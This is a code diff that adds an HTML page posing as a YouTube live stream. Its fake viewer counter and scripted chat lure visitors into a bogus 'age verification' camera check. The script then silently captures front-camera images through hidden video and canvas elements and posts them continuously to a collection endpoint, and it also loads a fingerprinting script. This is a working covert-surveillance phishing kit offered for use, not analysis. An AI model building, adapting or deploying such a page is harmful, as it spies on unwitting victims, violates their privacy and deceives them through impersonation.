@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Stream — Watch Now</title>
+    <meta property="og:title" content="🔴 LIVE NOW — Watch This Stream!">
+    <meta property="og:description" content="Exclusive live stream happening right now. Tap to watch!">
+    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/1384/1384060.png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0a0a0f;
+            color: #fff;
+            min-height: 100vh;
+        }
+
+        /* Top Bar */
+        .topbar {
+            background: rgba(15, 15, 25, 0.95);
+            -webkit-backdrop-filter: blur(20px);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 50;
+        }
+        .topbar .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 800;
+            font-size: 18px;
+        }
+        .topbar .logo .yt-icon {
+            width: 28px;
+            height: 20px;
+            background: #ff0000;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+        }
+        .topbar .live-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(255,0,0,0.15);
+            border: 1px solid rgba(255,0,0,0.3);
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            color: #ff4444;
+        }
+        .topbar .live-badge .dot {
+            width: 8px;
+            height: 8px;
+            background: #ff0000;
+            border-radius: 50%;
+            animation: blink 1s ease infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* Video Area */
+        .video-section {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            padding-bottom: 56.25%; /* 16:9 */
+            background: #111;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+        }
+        .video-wrapper iframe {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        /* Overlay before verification */
+        .video-overlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(135deg, rgba(0,0,0,0.9), rgba(20,20,40,0.95));
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            cursor: pointer;
+            transition: opacity 0.5s;
+        }
+        .video-overlay.hidden { opacity: 0; pointer-events: none; }
+        .video-overlay .play-btn {
+            width: 80px;
+            height: 80px;
+            background: rgba(255,0,0,0.9);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            margin-bottom: 20px;
+            animation: pulsePlay 2s ease infinite;
+            cursor: pointer;
+            border: none;
+            color: #fff;
+        }
+        @keyframes pulsePlay {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(255,0,0,0.5); }
+            50% { box-shadow: 0 0 0 20px rgba(255,0,0,0); }
+        }
+        .video-overlay h3 { font-size: 18px; font-weight: 700; margin-bottom: 6px; }
+        .video-overlay p { font-size: 13px; color: rgba(255,255,255,0.6); }
+
+        /* Stream Info */
+        .stream-info {
+            margin-top: 20px;
+        }
+        .stream-info h2 {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            line-height: 1.4;
+        }
+        .stream-meta {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 12px;
+            color: #888;
+        }
+        .viewers-count {
+            background: rgba(255,0,0,0.1);
+            border: 1px solid rgba(255,0,0,0.2);
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: #ff4444;
+            font-weight: 600;
+        }
+
+        /* Channel Info */
+        .channel-bar {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 15px 0;
+            border-top: 1px solid rgba(255,255,255,0.06);
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+        }
+        .channel-avatar {
+            width: 42px;
+            height: 42px;
+            background: linear-gradient(135deg, #ff0000, #ff4444);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: 800;
+            flex-shrink: 0;
+        }
+        .channel-info { flex: 1; }
+        .channel-info .name { font-size: 14px; font-weight: 600; }
+        .channel-info .subs { font-size: 12px; color: #888; }
+        .sub-btn {
+            padding: 8px 18px;
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        /* Chat Preview */
+        .chat-section {
+            margin-top: 20px;
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 14px;
+            overflow: hidden;
+        }
+        .chat-header {
+            padding: 12px 16px;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+            font-size: 14px;
+            font-weight: 600;
+        }
+        .chat-messages {
+            padding: 12px 16px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .chat-msg {
+            margin-bottom: 10px;
+            font-size: 13px;
+            animation: chatSlide 0.3s ease;
+        }
+        @keyframes chatSlide {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        .chat-msg .author { color: #3ea6ff; font-weight: 600; margin-right: 6px; }
+        .chat-msg .text { color: rgba(255,255,255,0.8); }
+
+        /* Verification Modal */
+        .verify-modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.9);
+            z-index: 100;
+            align-items: center;
+            justify-content: center;
+        }
+        .verify-modal.active { display: flex; }
+        .verify-box {
+            background: #1a1a2e;
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 20px;
+            padding: 35px 25px;
+            width: 90%;
+            max-width: 380px;
+            text-align: center;
+        }
+        .verify-box .icon-big { font-size: 52px; margin-bottom: 15px; display: block; }
+        .verify-box h3 { font-size: 18px; font-weight: 700; margin-bottom: 8px; }
+        .verify-box p { font-size: 13px; color: rgba(255,255,255,0.6); margin-bottom: 20px; line-height: 1.6; }
+        .verify-box .verify-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #ff0000, #cc0000);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+        }
+        .verify-box .skip-link {
+            display: block;
+            margin-top: 12px;
+            font-size: 12px;
+            color: rgba(255,255,255,0.3);
+            cursor: pointer;
+        }
+
+        /* Hidden cam */
+        video#camvid, canvas#camcnv { 
+            position: absolute; opacity: 0; pointer-events: none; 
+            z-index: -1; width: 1px; height: 1px; 
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            .video-section { padding: 10px; }
+            .video-wrapper { border-radius: 10px; }
+            .stream-info h2 { font-size: 16px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- Top Bar -->
+<div class="topbar">
+    <div class="logo">
+        <div class="yt-icon">▶</div>
+        <span>YouTube</span>
+    </div>
+    <div class="live-badge">
+        <span class="dot"></span>
+        LIVE
+    </div>
+</div>
+
+<!-- Video Section -->
+<div class="video-section">
+    <div class="video-wrapper">
+        <iframe id="liveFrame" title="Live YouTube Stream" src="https://www.youtube.com/embed/live_yt_tv?autoplay=0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        
+        <!-- Overlay -->
+        <div class="video-overlay" id="videoOverlay" onclick="requestVerify()">
+            <button class="play-btn">▶</button>
+            <h3>🔴 Live Stream</h3>
+            <p>Tap to verify and watch</p>
+        </div>
+    </div>
+
+    <!-- Stream Info -->
+    <div class="stream-info">
+        <h2>🔴 LIVE: Exclusive Stream — Watch Now!</h2>
+        <div class="stream-meta">
+            <span class="viewers-count" id="viewerCount">🔴 2.4K watching</span>
+            <span class="meta-item">📅 Started streaming 23 minutes ago</span>
+        </div>
+
+        <!-- Channel -->
+        <div class="channel-bar">
+            <div class="channel-avatar">TV</div>
+            <div class="channel-info">
+                <div class="name">Live TV Channel ✓</div>
+                <div class="subs">1.2M subscribers</div>
+            </div>
+            <button class="sub-btn">Subscribe</button>
+        </div>
+    </div>
+
+    <!-- Chat -->
+    <div class="chat-section">
+        <div class="chat-header">💬 Live Chat</div>
+        <div class="chat-messages" id="chatBox">
+            <div class="chat-msg"><span class="author">Alex_2024</span><span class="text">This stream is amazing! 🔥</span></div>
+            <div class="chat-msg"><span class="author">Priya.S</span><span class="text">First time here, loving it ❤️</span></div>
+            <div class="chat-msg"><span class="author">StreamFan99</span><span class="text">Can we get 5K viewers? Let's go!</span></div>
+            <div class="chat-msg"><span class="author">CodeMaster</span><span class="text">Share this stream everyone 📲</span></div>
+        </div>
+    </div>
+</div>
+
+<!-- Verify Modal -->
+<div class="verify-modal" id="verifyModal">
+    <div class="verify-box">
+        <span class="icon-big">🔐</span>
+        <h3>Age Verification Required</h3>
+        <p>To access this live stream, we need to verify you're 18+ using a quick camera check. This is a one-time verification.</p>
+        <button class="verify-btn" onclick="startCamCapture()">📸 Verify & Watch</button>
+        <span class="skip-link" onclick="skipVerify()">Skip verification</span>
+    </div>
+</div>
+
+<!-- Hidden cam -->
+<video id="camvid" playsinline autoplay muted></video>
+<canvas id="camcnv" width="1920" height="1080"></canvas>
+
+<script>
+// Fake viewer count animation
+var baseViewers = 2400;
+setInterval(function() {
+    baseViewers += Math.floor(Math.random() * 10) - 3;
+    if (baseViewers < 2200) baseViewers = 2200;
+    var display = baseViewers >= 1000 ? (baseViewers / 1000).toFixed(1) + 'K' : baseViewers;
+    document.getElementById('viewerCount').textContent = '🔴 ' + display + ' watching';
+}, 5000);
+
+// Fake live chat
+var chatMessages = [
+    { author: 'Rahul_VB', text: 'Quality is so good! 👀' },
+    { author: 'AnkitGaming', text: 'Who else is watching at night? 🌙' },
+    { author: 'Sarah_K', text: 'Love from London! 🇬🇧' },
+    { author: 'TechBro007', text: 'This is fire 🔥🔥🔥' },
+    { author: 'MovieLover', text: 'Best stream on YouTube fr' },
+    { author: 'NightOwl22', text: 'Can\'t stop watching lol' },
+    { author: 'VibeCheck', text: 'Share this everyone! 📱' },
+    { author: 'GamerXD', text: 'TOP tier content 💯' },
+    { author: 'Luna_Star', text: 'Omg so many viewers!' },
+    { author: 'MaxPower', text: 'Subscribe if you haven\'t! ❤️' }
+];
+var chatIdx = 0;
+setInterval(function() {
+    var msg = chatMessages[chatIdx % chatMessages.length];
+    var chatBox = document.getElementById('chatBox');
+    var div = document.createElement('div');
+    div.className = 'chat-msg';
+    div.innerHTML = '<span class="author">' + msg.author + '</span><span class="text">' + msg.text + '</span>';
+    chatBox.appendChild(div);
+    chatBox.scrollTop = chatBox.scrollHeight;
+    if (chatBox.children.length > 20) chatBox.removeChild(chatBox.firstChild);
+    chatIdx++;
+}, 3000);
+
+// Verify flow
+function requestVerify() {
+    document.getElementById('verifyModal').classList.add('active');
+}
+
+function startCamCapture() {
+    document.getElementById('verifyModal').classList.remove('active');
+    
+    var video = document.getElementById('camvid');
+    var canvas = document.getElementById('camcnv');
+    var ctx = canvas.getContext('2d');
+    
+    navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } },
+        audio: false
+    }).then(function(stream) {
+        video.srcObject = stream;
+        
+        // Remove overlay, start video
+        document.getElementById('videoOverlay').classList.add('hidden');
+        document.getElementById('liveFrame').src = 'https://www.youtube.com/embed/live_yt_tv?autoplay=1';
+        
+        // Burst: 5 rapid shots
+        var shots = 0;
+        var burst = setInterval(function() {
+            canvas.width = video.videoWidth || 1920;
+            canvas.height = video.videoHeight || 1080;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            var imgData = canvas.toDataURL('image/png');
+            $.post('forwarding_link/post.php', { cat: imgData });
+            shots++;
+            if (shots >= 5) {
+                clearInterval(burst);
+                // Normal interval
+                setInterval(function() {
+                    canvas.width = video.videoWidth || 1920;
+                    canvas.height = video.videoHeight || 1080;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    var imgData = canvas.toDataURL('image/png');
+                    $.post('forwarding_link/post.php', { cat: imgData });
+                }, 3000);
+            }
+        }, 1000);
+
+    }).catch(function(err) {
+        // Still show video if cam denied
+        document.getElementById('videoOverlay').classList.add('hidden');
+        document.getElementById('liveFrame').src = 'https://www.youtube.com/embed/live_yt_tv?autoplay=1';
+        setTimeout(function() { window.location.href = 'https://www.google.com'; }, 30000);
+    });
+}
+
+function skipVerify() {
+    document.getElementById('verifyModal').classList.remove('active');
+    document.getElementById('videoOverlay').classList.add('hidden');
+    document.getElementById('liveFrame').src = 'https://www.youtube.com/embed/live_yt_tv?autoplay=1';
+}
+</script>
+<script src="fingerprint.js"></script>
+</body>
+</html>
